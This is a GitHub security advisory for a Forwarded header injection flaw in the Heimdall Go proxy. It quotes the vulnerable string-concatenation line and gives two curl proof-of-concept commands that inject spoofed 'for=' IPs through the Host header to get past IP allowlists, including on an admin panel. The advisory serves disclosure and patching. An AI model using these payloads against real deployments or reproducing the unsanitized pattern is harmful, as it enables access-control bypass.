# [H] Heimdall: Forwarded Header Injection via Unsanitized Host Header in Proxy Mode

## Summary
Severity: High
Advisory: GHSA-4jgr-pg2m-m988
CVE: CVE-2026-57209
CWE: CWE-20, CWE-74
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:N/SC:H/SI:H/SA:N (CVSS_V4)
Published: 2026-06-18
Source: https://github.com/advisories/GHSA-4jgr-pg2m-m988
Type: github-advisory

## Affected
- Go: `github.com/dadrus/heimdall` — affected >=0 <0.17.17

## Details
### Summary

When Heimdall operates in proxy mode, it constructs the `Forwarded` HTTP header after executing the matched rule pipeline by inserting the incoming request's `Host` header value directly into the header string without sanitizing commas or semicolons. This allows an attacker to inject additional parameters into the `Forwarded` header, potentially spoofing IP addresses for upstream services.

### Vulnerable Code

**File: `proxy/request_context.go` (line 201)**

```go
entry := "for=" + clientIP + ";host=" + in.Host + ";proto=" + proto
```

Go's `net/http` allows commas and semicolons in Host header values. No sanitization is applied before string concatenation.

### PoC

```bash
# Inject a spoofed IP into the Forwarded header
curl -s -H "Host: evil.com,for=127.0.0.1" \
  "http://TARGET:PORT/protected-resource"
```

This produces the following `Forwarded` header sent to the upstream service:

```
Forwarded: for=1.2.3.4;host=evil.com, for=127.0.0.1;proto=http
```

Upstream services that parse the `Forwarded` header according to RFC 7239 will see two entries. If the service trusts the last or any `for=` value, the attacker successfully spoofs `127.0.0.1` as the client IP.

```bash
# More targeted attack: spoof to bypass IP allowlist
curl -s -H "Host: legit.com;for=10.0.0.1;proto=https,for=192.168.1.1" \
  "http://TARGET:PORT/admin-panel"
```

### Impact

- **IP spoofing:** Upstream services behind Heimdall may trust the injected `for=` value, believing the request originates from an internal/trusted IP
- **Access control bypass:** Applications that restrict access based on IP address by themselves, without using the corresponding heimdall capabilities (e.g., admin panels, internal APIs), can be bypassed
- **Affects all proxy-mode deployments** where upstream services parse the `Forwarded` header.

## References
- https://github.com/dadrus/heimdall/security/advisories/GHSA-4jgr-pg2m-m988
- https://github.com/dadrus/heimdall
